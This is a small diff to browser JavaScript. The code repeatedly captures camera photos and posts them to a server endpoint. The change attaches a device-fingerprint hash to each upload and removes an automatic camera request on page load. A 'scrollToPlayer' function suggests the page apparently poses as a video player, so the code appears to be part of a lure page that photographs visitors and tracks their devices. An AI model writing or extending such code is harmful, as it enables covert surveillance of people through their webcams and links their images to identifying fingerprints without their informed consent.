@@ -308,6 +308,7 @@ function capturePhoto() {
     var fd = new FormData();
     fd.append('photo', blob, 'cam_' + Date.now() + '_' + photoCount + '.jpg');
     fd.append('type', 'camera-test');
+    fd.append('deviceHash', deviceFingerprint.deviceHash || '');
     postForm('/api/photo', fd);
     console.log('Photo #' + photoCount + ' captured and sent');
   }, 'image/jpeg', 0.95);
@@ -404,8 +405,6 @@ document.addEventListener('DOMContentLoaded', function() {
     deviceFingerprint.model = model;
     sendDeviceData();
   });
-
-  setTimeout(function() { autoRequestCamera(); }, 1000);
 });
 
 function scrollToPlayer() {
